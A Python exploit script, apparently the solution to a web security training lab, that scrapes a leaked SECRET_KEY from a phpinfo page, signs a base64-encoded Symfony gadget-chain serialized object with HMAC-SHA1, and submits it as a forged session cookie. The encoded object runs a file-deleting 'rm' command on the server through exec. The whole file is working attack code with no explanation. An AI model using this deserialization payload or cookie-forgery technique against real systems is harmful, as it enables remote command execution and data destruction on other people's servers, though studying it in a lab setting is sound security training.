from urllib.parse import quote
import requests
import base64
import re
import sys
import hmac
import hashlib

if len(sys.argv) != 2:
    print("Usage: python3 solution.py <url>")
    sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
my_acc = burp_url + '/my-account'
php_info = burp_url + '/cgi-bin/phpinfo.php'

session = requests.Session()

response = session.get(php_info)
key_match = re.search(r'SECRET_KEY </td><td class="v">([0-9a-zA-Z]{32})', response.text)
secretKey = key_match.group(1)

object = ("Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6"
          "NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJl"
          "ZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjEx"
          "OiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9z"
          "L21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdh"
          "cmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlB"
          "ZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0"
          "ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94"
          "eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==")

# Generowanie podpisu HMAC SHA1
sig_hmac_sha1 = hmac.new(secretKey.encode(), object.encode(), hashlib.sha1).hexdigest()

# Tworzenie ciasteczka
cookie = quote(f'{{"token":"{object}","sig_hmac_sha1":"{sig_hmac_sha1}"}}')

# Ustawienie ciasteczka
burp_cookies = {"session": cookie}
response = requests.get(my_acc, cookies=burp_cookies)

print(response.text)
